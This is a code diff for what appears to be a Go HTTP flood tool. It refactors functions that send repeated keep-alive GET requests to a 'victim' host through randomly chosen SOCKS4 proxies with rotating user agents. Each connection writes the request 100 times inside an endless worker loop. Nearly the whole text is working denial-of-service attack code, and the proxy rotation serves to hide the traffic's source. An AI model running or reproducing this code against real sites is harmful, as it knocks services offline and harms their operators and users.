@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"net/url"
 	"os"
 	"os/exec"
 	"time"
@@ -56,29 +57,31 @@ func readLines(fileName string) []string {
 	return lines
 }
 
-func handle(host, port, method, path, useragent, proxy string, n int) {
+func flood(host, useragent, proxy string, n int) {
 	var conn net.Conn
 
-	request := []byte(fmt.Sprintf(
-		"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",
-		method,
-		path+randomParam(),
-		host,
-		useragent,
-	))
-
-	address := fmt.Sprintf("%s:%s", host, port)
-
-	// Dialer
-	dialer, err := proxyclient.NewProxyClient("socks4://" + proxy)
-
+	victim, err := url.Parse(host)
 	if err != nil {
 		return
 	}
 
-	// Connect
-	conn, err = dialer.DialTimeout("tcp", address, 5*time.Second)
+	header := []byte("GET / HTTP/1.1\r\n" +
+		"Host: " + victim.Hostname() + "\r\n" +
+		"User-Agent: " + useragent + "\r\n" +
+		"Connection: keep-alive\r\n" +
+		"\r\n")
 
+	dialer, err := proxyclient.NewProxyClient("socks4://" + proxy)
+	if err != nil {
+		return
+	}
+
+	port := "80"
+	if victim.Scheme == "https" {
+		port = "443"
+	}
+
+	conn, err = dialer.DialTimeout("tcp", victim.Hostname()+":"+port, 5*time.Second)
 	if err != nil {
 		return
 	}
@@ -92,13 +95,13 @@ func handle(host, port, method, path, useragent, proxy string, n int) {
 
 	defer conn.Close()
 	for i := 0; i < n; i++ {
-		conn.Write(request)
+		conn.Write(header)
 	}
 }
 
-func flood(host, port, method, path string, useragents, proxies []string) {
+func worker(host string, useragents, proxies []string) {
 	for {
-		handle(host, port, method, path, random(useragents), random(proxies), 100)
+		flood(host, random(useragents), random(proxies), 100)
 	}
 }
 
